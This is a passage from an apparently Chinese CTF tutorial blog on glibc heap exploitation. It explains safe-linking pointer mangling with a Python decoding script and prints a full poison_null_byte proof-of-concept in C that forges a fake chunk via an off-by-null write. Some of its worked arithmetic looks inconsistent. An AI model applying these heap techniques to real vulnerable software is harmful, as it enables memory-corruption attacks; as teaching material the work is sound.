class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="type">long</span> plaintext = <span class="built_in">decrypt</span>(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	<span class="built_in">assert</span>(plaintext == (<span class="type">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>对 <code>tcache_next(fd)</code> 新增检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 原理: A:fd;B:(pos&gt;&gt;12);C:(ptr); A=B^C; C=A^B;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png"
                      alt="eg"
                ></p>
<p><code>P</code> 表示将保存在空闲块的 <code>fd</code> 字段中的指针值。<code>L</code> 表示 <code>fd</code> 字段本身的地址。<code>L&gt;&gt;12</code>是 <code>L</code> 的右移值，用于对 <code>P</code> 进行异或运算，从而产生一个编码指针<code>P&#39;</code>。<code>Safe Linking</code> 将这个<code>P&#39;</code>值存储在 <code>fd</code> 字段中。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png"
                      alt="image-20231016094308974"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png"
                      alt="image-20231016094240180"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png"
                      alt="image-20231016094355521"
                ></p>
<p><code>bypass safe-linking</code>机制需要用到 <code>uaf</code>或者 <code>double free</code> 之类的漏洞, 同时释放 <code>tcache</code>到一个空闲 <code>tacahe bin</code>中, 此时由于<code>tcache bin</code> 中没有空闲<code>chunk</code>, <code>tcache-&gt;entry[tc_idx]=0</code>，若存在 <code>uaf</code> 或者 <code>double free</code>，可以泄露出 <code>leak_addr= (&amp;tcache_chunk-&gt;fd)&gt;&gt;12</code> 位置, 则 <code>heap_base=leak_addr&lt;&lt;12</code>。<code>double free</code> 需要将 <code>tcache_chunk_bk</code> 改为 <code>0</code>，绕过检查。对于 <code>2.32</code>及以后的 <code>glibc</code> 版本的 <code>tcache_poisoning</code> 需要将 <code>target</code> 地址进行加密。</p>
<h3 id="调试-25"><a href="#调试-25" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png"
                      alt="image-20231016095050228"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png"
                      alt="image-20231016095208868"
                ></p>
<p>申请<code>a,b</code>两个 <code>tcache_chunk</code>，最后一个 <code>chunk_0x10</code> 用于隔离，下面解析 <code>b_fd</code>。</p>
<ul>
<li>解密脚本:</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        bits= <span class="number">64</span>-<span class="number">12</span>*(i)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;round %d:\n&quot;</span>%(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>%key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>%plain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>%cipher)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>原理:</li>
</ul>
<p>前置:</p>
<p><code>P:0x0000_555_555_55b_2a0; L:0x0000_555_555_55b_2d0; L&gt;&gt;12:0x0000_000_555_555_55b; p&#39;:0x0000_555_000_00e_7fb</code></p>
<p><code>(0x55555555b2d0 &gt;&gt; 12) = 0x55555555B; 0x55555555b2a0 ^ 0x55555555B = 0x55500000E7FB;</code></p>
<p>步骤:</p>
<p><code>P ^ (L &gt;&gt; 12);</code>。 此时 <code>L</code> 高 <code>12</code> 位为 <code>0</code>，而 <code>P</code> 高 <code>12</code> 位为 <code>0x555</code>，异或时将保留 <code>0x0000_555</code>，而异或操作又是可逆的，所以用保留的 <code>0x0000_555_000_000_000</code> 和 低位 <code>0x0000_000_555_000_000</code> 取异或即可得到低三位的真实地址，以此类推有了以下步骤。</p>
<p>1. </p>
<p><code>bits = 52; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 52) &lt;&lt; 52 = 0x000_000_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0;</code></p>
<p>2. </p>
<p><code>bits = 40; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 40) &lt;&lt; 40 = 0x000_055_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_000_000_0</code> </p>
<p>3. </p>
<p><code>bits = 28; </code></p>
<p><code>key = 0x000_000_055_000_000_0; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_000_000_0) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_000_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_0000;</code></p>
<p>4. </p>
<p><code>bits = 16; </code></p>
<p><code>key = 0x000_000_055_555_0000; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_0000) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_5550;</code></p>
<p>5. </p>
<p><code>bits = 4; </code></p>
<p><code>key = 0x000_000_055_555_5550; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_5550) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_b2a0  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_055_555_555_b;</code></p>
<h2 id="poison-null-byte（glibc-2-28）"><a href="#poison-null-byte（glibc-2-28）" class="headerlink" title="poison_null_byte（glibc &gt; 2.28）"></a>poison_null_byte（glibc &gt; 2.28）</h2><h3 id="源码-26"><a href="#源码-26" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to poison null byte!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step1: allocate padding</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line">	<span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step3: link prev into largebin</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep3: Link prev into largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nCurrent Heap Layout\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    ... ...\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;padding\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span></span><br><span class="line">     	 <span class="string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free a, b, prev&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);</span><br><span class="line">	assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);</span><br><span class="line">	((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);</span><br><span class="line">	*(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step5: bypass unlinking</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take b out first by allocating 0x510&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span></span><br><span class="line">			<span class="string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;  <span class="comment">// b-&gt;fd &lt;- fake_chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span></span><br><span class="line">			<span class="string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">free</span>(a2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="type">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">// pass unlink_chunk in malloc.c:</span></span><br><span class="line">	<span class="comment">//      mchunkptr fd = p-&gt;fd;</span></span><br><span class="line">	<span class="comment">//      mchunkptr bk = p-&gt;bk;</span></span><br><span class="line">	<span class="comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">	<span class="comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And we have:\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span></span><br><span class="line">		 );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take victim out from unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, victim2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;off-by-null into the size of vicim&quot;</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span></span><br><span class="line">			<span class="string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span></span><br><span class="line">			<span class="string">&quot;add the merged chunk into unsortedbin.&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="type">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span></span><br><span class="line">			<span class="string">&quot;And it is overlapped with the prev chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);</span><br><span class="line">	<span class="built_in">memset</span>(merged, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	<span 